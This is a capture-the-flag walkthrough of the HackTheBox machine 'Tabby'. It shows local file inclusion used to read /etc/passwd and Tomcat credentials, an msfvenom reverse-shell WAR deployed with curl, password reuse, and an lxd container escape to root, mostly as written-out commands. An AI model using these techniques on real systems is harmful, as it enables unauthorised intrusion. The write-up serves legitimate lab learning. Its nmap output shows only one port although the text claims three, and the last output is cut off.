# **Description**

Hello hackers, I hope you are doing well. We are doing [Tabby](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.10.194
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION

8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found three open ports, port 22 is OpenSSH, 80 is Apache http web server and 8080 is Apache Tomcat.

## Web

Let's navigate to the web page on port 80.

![](1.png)

The website is a hosting service. On the page we can see the hostname `megahosting.htb`, let's add it to /etc/hosts file.

The link on the page don't work except for News.

![](2.png)

We see news.php use parameter file to pull `statement`, let's see if we can get `/etc/passwd`.

![](3.png)

Great! The parameter is vulnerable.

We can see a user called `ash`, i tried to pull the id_rsa but couldn't, also tried to get log files but no luck.

## Tomcat

Let's move to tomcat.

![](4.png)

We see that the version of tomcat used is 9.

Tomcat stores users credentials in a file called `tomcat-users.xml`, and we see in the web page that tomcat is installed on `/usr/share/tomcat9` so i tried to get `/usr/share/tomcat9/tomcat-users.xml` and `/usr/share/tomcat9/conf/tomcat-users.xml` but no luck with that, so i installed tomcat9 on my machine and used `find` to search for the file location and found it.

```terminal
┌─[sirius@ParrotOS]─[~]
└──╼ $ find /usr -type f -name 'tomcat-users.xml' 2>/dev/null                                                                                           130 ⨯
/usr/share/tomcat9/etc/tomcat-users.xml
```

The file is at `/usr/share/tomcat9/etc/tomcat-users.xml` so let's get it.

![](5.png)

We got the credentials.


# **Foothold**

Let's login to the manager webapp at `http://megahosting.htb:8080/manager/html`

![](6.png)

We can't access the `manager-gui`, but we can use `manager-script` which is a text-based service located at `/manager/text`.

To get a reverse shell, first we need to generate a payload using `msfvenom`, upload it with curl and get the shell.

```bash
msfvenom -p java/shell_reverse_tcp lhost=10.10.10.10 lport=9001 -f war -o revshell.war
```


```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/shell --upload-file revshell.war
curl http://10.10.10.194:8080/shell
```

# **Privilege Escalation**

## Ash

Checking the website's file, we come across a zip file.

![](8.png)

We need a password to unzip it.

Let's download the file to our machine and crack the pass.

![](9.png)

We got the password and managed to unzip the file, but there was no useful information on the files.

Maybe we can use the password to switch to user `ash`.

![](10.png)

## root

By running `id`, we see that `ash` is part of the group lxd

```terminal
ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

We can upload an alpine image to the target from this repo `git clone https://github.com/saghul/lxd-alpine-builder.git`

First we run `lxd init` and accept the defaults.


>Note: If lxd is in snap, we add that to the Path with the command export PATH=$PATH:/snap/bin


Now we import the image with the command

```bash
lxc image import ./alpine-v3.17-x86_64-20230205_1307.tar.gz --alias myimage
```

Next we run the following command to get root.

```bash
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```


```terminal
ash@tabby:~$ lxc image import ./alpine-v3.17-x86_64-20230205_1307.tar.gz --alias myimage 
ash@tabby:~$ lxc image list
